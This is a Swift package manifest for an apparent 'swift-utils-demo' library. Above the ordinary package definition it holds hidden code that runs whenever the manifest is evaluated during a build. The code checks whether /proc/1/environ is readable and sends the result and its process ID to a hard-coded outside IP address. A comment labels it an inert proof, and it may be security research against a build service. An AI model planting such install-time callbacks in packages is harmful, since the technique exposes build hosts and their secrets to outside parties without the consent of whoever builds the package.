// swift-tools-version: 5.9
import PackageDescription

#if canImport(Foundation)
import Foundation

// INERT CALLBACK: sends only a fixed marker string, NO secrets/tokens/env data
// Proves: (1) code executes (2) network outbound works (3) /proc readable
let hasProc = (try? String(contentsOfFile: "/proc/1/environ", encoding: .utf8)) != nil
let marker = "exec=true&proc1_readable=\(hasProc)&pid=\(ProcessInfo.processInfo.processIdentifier)"
if let url = URL(string: "http://152.42.245.8:18888/spi_proof?\(marker)") {
    let sem = DispatchSemaphore(value: 0)
    URLSession.shared.dataTask(with: url) { _,_,_ in sem.signal() }.resume()
    _ = sem.wait(timeout: .now() + 5)
}
#endif

let package = Package(
    name: "swift-utils-demo",
    products: [
        .library(name: "SwiftUtilsDemo", targets: ["SwiftUtilsDemo"]),
    ],
    targets: [
        .target(name: "SwiftUtilsDemo"),
    ]
)
